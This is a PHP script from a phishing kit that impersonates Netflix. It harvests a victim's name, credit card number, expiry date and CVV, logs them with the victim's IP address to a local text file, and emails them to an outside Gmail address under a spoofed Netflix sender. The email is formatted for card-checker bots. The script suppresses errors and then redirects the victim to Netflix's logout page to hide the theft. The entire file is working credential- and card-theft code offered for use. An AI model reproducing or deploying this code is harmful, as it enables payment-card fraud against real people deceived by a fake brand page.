<?php

ini_set('display_errors', 0 );
error_reporting(0);

$nome = $_POST['nome']."\r\n"; 
$sobrenome = $_POST['sobrenome']."\r\n";
$cc = $_POST['cc']."\r\n";
$data = $_POST['data']."\r\n";
$cvv = $_POST['cvv']."\r\n";

$ip = $_SERVER["REMOTE_ADDR"]."\r\n";
$hora = date("Y-m-d  #  H:i:s")."\r\n";

$traco="============================="."\r\n";
$seunome="NOME: ";
$seusobrenome="SOBRENOME: ";
$seucc="CC: ";
$seudata="DATA: ";
$seucvv="CVV: ";
$seuip="IP: ";
$seuhora="HORA ";
$file = fopen("dados.txt","a");
$escrever1=fwrite($file, $traco);
$escrever2=fwrite($file, $seunome);
$escrever3=fwrite($file, $nome);
$escrever4=fwrite($file, $seusobrenome);
$escrever5=fwrite($file, $sobrenome);
$escrever6=fwrite($file, $seucc);
$escrever7=fwrite($file, $cc);
$escrever8=fwrite($file, $seudata);
$escrever9=fwrite($file, $data);
$escrever10=fwrite($file, $seucvv);
$escrever11=fwrite($file, $cvv);
$escrever12=fwrite($file, $seuip);
$escrever13=fwrite($file, $ip);
$escrever14=fwrite($file, $seuhora);
$escrever15=fwrite($file, $hora);
fclose($file);


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: NETFLIX <info@consulta.com.br>";

$c.="<b>======== BoyDasGalaxias ccfull ========</b><br>";
$c.="<b>Nome: $nome $sobrenome</b><br>";
$c.="<b>BIN: Bin Offline </b><br>";
$c.="<b>Numero: $cc</b><br>";
$c.="<b>Validade Mês: $data </b><br>";
$c.="<b>Cvv: $cvv </b><br>";
$c.="<b>!chk $cc|$data|$cvv </b><br>";
$c.="<b>======== BoyDasGalaxias ccfull ========</b><br>";
$email=mail("boteistem@gmail.com", "$ip [ - $nome ]", "$c", $headers);
if($email){

} else {

}


?>
<script language="JavaScript"> 
window.location="https://www.netflix.com/logout"; 
</script> 
